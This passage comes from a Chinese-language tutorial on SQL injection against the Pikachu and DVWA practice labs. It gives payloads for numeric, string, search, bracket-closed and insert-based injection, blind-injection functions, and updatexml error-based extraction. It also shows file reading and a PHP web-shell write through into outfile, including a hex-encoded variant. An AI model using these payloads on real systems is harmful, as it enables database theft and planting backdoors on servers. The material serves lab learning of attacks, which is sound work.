class="headerlink" title="注入常用套路"></a>注入常用套路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line"></span><br><span class="line">?id=1&#x27;      # 返回异常可能存在注入</span><br><span class="line">?id=1&#x27;#     # 井号注释掉后面的sql语句，返回正常可能存在注入(#需要转成%23)</span><br><span class="line">?id=1&#x27;--    # --注释掉后面的sql语句，在url时(GET请求)中得改成--+，返回正常可能存在注入</span><br><span class="line">?id=1 and 1=1   # 返回正常可能存在注入</span><br><span class="line">?id=1 and 1=2   # 返回异常可能存在注入</span><br><span class="line">?id=1 or 1=1    # 返回正常可能存在注入</span><br><span class="line">?id=1 and select sleep(5)   # 网页加载时间比平时慢5秒可能存在注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数量</span><br><span class="line"></span><br><span class="line">?id=1&#x27; order by 1#      # 调整数字大小，在正常与异常的临界点则为字段数量</span><br><span class="line">?id=1&quot; order by 1#</span><br><span class="line">?id=1 order by 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询数据库名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,2,database()#</span><br><span class="line">?id=1&quot; union select 1,2,database()#</span><br><span class="line">?id=1 union select 1,2,database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,TABLE_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=database()#</span><br><span class="line">?id=1 union select 1,TABLE_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查字段名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=database()#        # 猜所有表的字段</span><br><span class="line">?id=1 union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=database()</span><br><span class="line">?id=1&#x27; union select 1,COLUMN_NAME FROM information_schema.columns where TABLE_NAME=&#x27;users&#x27;#     # 单独查询某个表的字段</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查字段内容</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 字段1,字段2，字段3 from 表名#</span><br><span class="line">?id=1 union select 字段1,字段2，字段3 from 表名</span><br><span class="line">?id=1 union select 1,group_concat(字段名) from 表名      # 一般查询是一列输出的，group_concat()是拼接为一行输出的</span><br><span class="line">?id=1 union select 1,group_concat(字段名) from 库名.表名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">select load_file(&#x27;/flag.txt&#x27;)                   # 直接在数据库中执行</span><br><span class="line">?id=1 union select 1,load_file(&#x27;/flag.txt&#x27;)      # 联合查询读文件</span><br><span class="line">?id=1 union select 1,load_file(0x2f666c61672e747874)        # 如果过滤的是&#x27;或者是&quot;时 使用十六进制对其进行编码</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;     # 直接在数据库中执行</span><br><span class="line">?id=1 union select &#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">?id=1 union select &#x27;&lt;?php @eval(\$_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;; # 在一定条件下需要使用\把$注释掉</span><br><span class="line"></span><br><span class="line">select 0x3c3f70687020406576616c28245f504f53545b2261225d293b3f3e into outfile &#x27;/var/www/html/1.php&#x27;; # 将一句话马转为16进制</span><br></pre></td></tr></table></figure><h2 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h2><p><code>length()</code> 返回字符串的长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: length(查询到的数据)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select length(database());      # 查询当前数据库名的长度</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(database())&gt;2; # 查询当前数据库名的长度是否大于2，正确返回1，错误返回0</span><br><span class="line">+----------------------+</span><br><span class="line">| length(database())&gt;2 |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><code>substr()</code>截取字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: substr(字符串,起始位置,截取长度)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select substr(database(),1,1);  # 查询当前数据库名的第一个字符，返回 d</span><br><span class="line">select substr(database(),2,1);  # 查询当前数据库名的第一个字符，返回 v</span><br><span class="line">select substr(database(),1,2);  # 查询当前数据库名的前两个字符，返回 dv</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database(),1,2);</span><br><span class="line">  +------------------------+</span><br><span class="line">  | substr(database(),1,2) |</span><br><span class="line">  +------------------------+</span><br><span class="line">  | dv                     |</span><br><span class="line">  +------------------------+</span><br></pre></td></tr></table></figure><p><code>ascii()</code>返回字符的Ascii码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: ascii(单个字符)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select ascii(&#x27;a&#x27;);      # 查询字符a的ascii码，返回97</span><br><span class="line">select ascii(substr(database(),1,1));       # 查询当前数据库名第一个字符的ascii码，返回100对应的字符为d</span><br><span class="line">select ascii(substr(database(),2,1));       # 查询当前数据库名第二个字符的ascii码，返回118对应的字符为v</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(database(),2,1));</span><br><span class="line">  +-------------------------------+</span><br><span class="line">  | ascii(substr(database(),2,1)) |</span><br><span class="line">  +-------------------------------+</span><br><span class="line">  |                           118 |</span><br><span class="line">  +-------------------------------+</span><br></pre></td></tr></table></figure><p><code>sleep()</code> 延时函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: sleep(延时时间)</span><br><span class="line">示例:</span><br><span class="line">select sleep(2)     # 延时2秒</span><br><span class="line"></span><br><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">  +----------+</span><br><span class="line">  | sleep(2) |</span><br><span class="line">  +----------+</span><br><span class="line">  |        0 |</span><br><span class="line">  +----------+</span><br><span class="line">  1 row in set (2.00 sec)       # 执行时间</span><br></pre></td></tr></table></figure><p><code>if()</code> 条件函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: if(语句1,语句2，语句3)</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">如果语句1执行正确则接着执行语句2，如果执行错误则执行语句3</span><br><span class="line">select if(1=1,&#x27;yes&#x27;,&#x27;no&#x27;);      # 如果1=1成立则返回yes，不成立则返回no</span><br><span class="line">select if(1=1,sleep(2),&#x27;no&#x27;);    # 如果1=1成立则延时2秒，不成立则返回no</span><br><span class="line">select if(substr(database(),1,1)=&#x27;d&#x27;,&quot;yes&quot;,&quot;no&quot;);       # 当前数据库名第一个字符为d则返回yes</span><br><span class="line">select if(ascii(substr(database(),1,1))=100,&quot;yes&quot;,&quot;no&quot;); # 当前数据库名第一个字符的ascii码为100则返回yes</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(length(database())&gt;2,&quot;yes&quot;,&quot;no&quot;);  # 当前数据库名长度大于2的话则返回yes</span><br><span class="line">  +-------------------------------------+</span><br><span class="line">  | if(length(database())&gt;2,&quot;yes&quot;,&quot;no&quot;) |</span><br><span class="line">  +-------------------------------------+</span><br><span class="line">  | yes                                 |</span><br><span class="line">  +-------------------------------------+</span><br></pre></td></tr></table></figure><p><code>limit</code> 限制查询条数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当猜表名时有多个表（substr函数一次只能处理一个字符串），需要用到limit 来限制一次只能输出一个表(一个字符串)</span><br><span class="line"># (limit索引从0开始)</span><br><span class="line"></span><br><span class="line">语法: limit 其起始,输出个数</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">users表下的user_id字段有内容: 1,2,3,4,5</span><br><span class="line">select user_id from users limit 0,1     # 从第1个内容开始查询，返回一条数据，结果为1</span><br><span class="line">select user_id from users limit 1       # 同上(起始位置默认为0)</span><br><span class="line">select user_id from users limit 1,1     # 从第2个内容开始查询，返回一条数据，结果为2</span><br><span class="line">select user_id from users limit 0,2     # 从第1个内容开始查询，返回两条数据，结果为12</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第一个数据表表名长度</span><br><span class="line">mysql&gt; select length((select table_name from information_schema.tables where table_schema=database() limit 0,1));</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">| length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                  9 |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第二个数据表表名长度</span><br><span class="line">mysql&gt; select length((select table_name from information_schema.tables where table_schema=database() limit 1,1));</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">| length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                  5 |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第一个数据表的第一个字符的内容</span><br><span class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1);</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| g                                                                                                      |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 不使用limit限制查询时</span><br><span class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database()),1,1);</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row        # 报错子查询超过一行</span><br></pre></td></tr></table></figure><p><code>count()</code> 返回查询数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: count(查询到的数据)</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">users表下的user_id字段有内容: 1,2,3,4,5</span><br><span class="line">select count((select user_id from users));      # 查询users表下的user_id字段有几个内容，返回5</span><br><span class="line">select count(schema_name) from information_schema.schemata;     # 查询数据库个数</span><br><span class="line">select count(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;;        # 查询指定数据库的表个数</span><br><span class="line">select count(column_name) from information_schema.columns where table_schema=&#x27;库名&#x27; and table_name=&#x27;表名&#x27;;  # 查询指定库下表的字段个数</span><br><span class="line">select count(字段名) from 库名.表名        # 查询指定库-&gt;表-&gt;字段 下的内容个数</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(schema_name) from information_schema.schemata;</span><br><span class="line">+--------------------+</span><br><span class="line">| count(schema_name) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 10 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><code>group_concat()</code> 成组返回</p><h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><h3 id="防御方式-17"><a href="#防御方式-17" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对Sql注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,email from member where id=<span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;       # 异常(You have an error in your SQL syntax; )</span><br><span class="line">id=1#       # 正常</span><br><span class="line">id=1 and 1=1    # 正常</span><br><span class="line">id=1 and 1=2    # 异常(您输入的user id不存在，请重新输入！)</span><br><span class="line"></span><br><span class="line">// 该注入类型为数字型注入</span><br></pre></td></tr></table></figure><h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 2     # 正常</span><br><span class="line">id=1 order by 3     # 异常(Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;)</span><br><span class="line"></span><br><span class="line">// 共有两个字段</span><br></pre></td></tr></table></figure><h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回数据库名为pikachu</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> pikachu <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br></pre></td></tr></table></figure><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回表名有 httpinfo,<span class="keyword">member</span>,message,users,xssblind</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> httpinfo,<span class="keyword">member</span>,message,users,xssblind <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"></span><br><span class="line">### 查询字段名</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">users表</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>该表下有字段id,username,password,level</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> id,username,password,level <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br></pre></td></tr></table></figure><h3 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">users表下的username，password字段内容</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username           <span class="operator">|</span> email                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin,pikachu,test <span class="operator">|</span> e10adc3949ba59abbe56e057f20f883e,<span class="number">670</span>b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="防御方式-18"><a href="#防御方式-18" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞利用-18"><a href="#漏洞利用-18" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27;        # 返回异常</span><br><span class="line">?name=vince&quot;        # 返回正常</span><br><span class="line">?name=vince&#x27;%23     # 返回正常</span><br><span class="line">?name=vince&#x27; and &#x27;1&#x27;=&#x27;1     # 返回正常</span><br><span class="line">?name=vince&#x27; and &#x27;1&#x27;=&#x27;2     # 返回异常</span><br><span class="line"></span><br><span class="line">//该注入类型为字符型，且闭合符号为 &#x27;</span><br></pre></td></tr></table></figure><p>将数字型的Payload变形一下就可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=vince&#x27; order by 2%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?name=vince&#x27; union select 1,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=vince&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=vince&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=vince&#x27; union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><h3 id="防御方式-19"><a href="#防御方式-19" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,id,email from member where username like &#x27;%<span class="subst">$name</span>%&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>漏洞利用</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xx,xx,xx <span class="keyword">from</span> xx <span class="keyword">where</span> xxx <span class="keyword">like</span> <span class="string">&#x27;%输入的值%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>继续判断该级别的SQL闭合符号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=a%&quot;%23        # 搜索异常</span><br><span class="line">?name=a%&#x27;%23        # 搜索正常</span><br><span class="line">?name=%&#x27;%23         # 搜索异常(所有用户信息全部出现)</span><br><span class="line">?name=a%&#x27;)%23       # 异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//可以确定该查询的闭合为 &#x27;%xx%&#x27;</span><br></pre></td></tr></table></figure><p>Payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=a%&#x27; order by 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名(为了方便观察，把查询的字符改成其他)</span><br><span class="line">?name=1%&#x27; union select 1,2,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=1%&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><h3 id="防御方式-20"><a href="#防御方式-20" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>漏洞利用<br>xx型不是一种注入类型，只是修改了上方的闭合符号而已</p><p>根据题目可以了解到大概的SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx,xxx,xxx <span class="keyword">from</span> xxx <span class="keyword">where</span> xxx<span class="operator">=</span><span class="string">&#x27;xx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>继续判断该级别的SQL闭合符号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=allen         # 显示正常</span><br><span class="line">?name=allen&#x27;%23     # 显示异常</span><br><span class="line">?name=allen&quot;%23     # 显示异常</span><br><span class="line">?name=allen&#x27;)%23     # 显示正常</span><br><span class="line">?name=allen&quot;)%23     # 显示异常</span><br><span class="line"></span><br><span class="line">//可以确定该级别的闭合符号为 (&#x27;xxx&#x27;)</span><br></pre></td></tr></table></figure><p>对上题的Payload进行变形即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=a&#x27;) order by 2%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?name=1&#x27;) union select 1,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=1&#x27;) union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><h3 id="防御方式-21"><a href="#防御方式-21" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>相关函数<br>updatexml() 函数将xml_target中用xpath路径匹配到xml片段后应new_xml替换，返回更改后的xml</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">updatexml(xml_target,xpath,new_xml)</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>);  # 查询数据库名(<span class="number">0x7e</span>为十六进制的<span class="operator">~</span>)</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~pikachu~&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);     # 查询用户名</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~root@192.168.132.222~&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>);       # 不使用concat()时查询数据不完整</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;@192.168.132.222&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>);      # 查询数据库版本号</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.5.62-log~&#x27;</span></span><br></pre></td></tr></table></figure><p>extractValue() 函数返回xml_frag用xpath路径匹配到的xml片段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 语法</span><br><span class="line">extractValue(xml_frag,xpath)</span><br></pre></td></tr></table></figure><p>漏洞利用<br>使用BurpSuite抓包后可以看到注册时提交的输入如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编码前</span><br><span class="line">username=test&amp;password=123456&amp;sex=男&amp;phonenum=12312312311&amp;email=123@qq.com&amp;add=北京&amp;submit=submit</span><br><span class="line"></span><br><span class="line"># 编码后</span><br><span class="line">username=test&amp;password=123456&amp;sex=%E7%94%B7&amp;phonenum=12312312311&amp;email=123%40qq.com&amp;add=%E5%8C%97%E4%BA%AC&amp;submit=submit</span><br></pre></td></tr></table></figure><p>可以推算出注册用户时大概的SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">可以推算出注册用户时大概的<span class="keyword">SQL</span>语句如下：</span><br></pre></td></tr></table></figure><p>构造如下Payload测试是否存在SQL注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br><span class="line"></span><br><span class="line"># 返回注册成功,该处存在SQL注入</span><br><span class="line"># SQL语句如下</span><br><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>猜数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line"># SQL语句如下</span><br><span class="line">mysql&gt; insert into member(username,pw,sex,phonenum,email,address) values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or 